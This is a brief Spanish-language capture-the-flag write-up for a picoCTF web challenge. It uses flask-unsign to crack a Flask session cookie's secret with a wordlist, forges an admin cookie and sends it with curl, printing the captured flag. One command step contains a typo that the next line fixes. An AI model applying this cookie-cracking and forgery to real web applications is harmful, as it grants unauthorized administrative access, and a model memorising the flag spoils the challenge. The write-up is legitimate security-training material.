







#### Solucion
1. Descargamos el server.py 
```wget https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py```

2. ```cat server.py```
3. ```python3 -m venv ~/.venv```
4. ```source ~/.venv/bin/activate```
5. ```python3 -m pip install flask-unsign```
6. ```flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-xuQA.hfWvoKIBPKJ4CNIYnMlu-a7X57s" --wordlist cookies.txt```
7. ```flask-unsign --sign cookie "{'very_auth': 'admin'}" --secret "peanut butter```
8. ```flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"```
9. ```curl http://mercury.picoctf.net:52134/display```
10. ```curl http://mercury.picoctf.net:52134/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-xwEQ.hkm1PcDUvUQYRh0eMhSEUMI7N1s" | grep pico```
11. NOS DA LA BANDERA **```
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1194  100  1194    0     0   3769      0 --:--:-- --:--:-- --:--:--  3778
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_478da04c}</code></p>
                             
```**
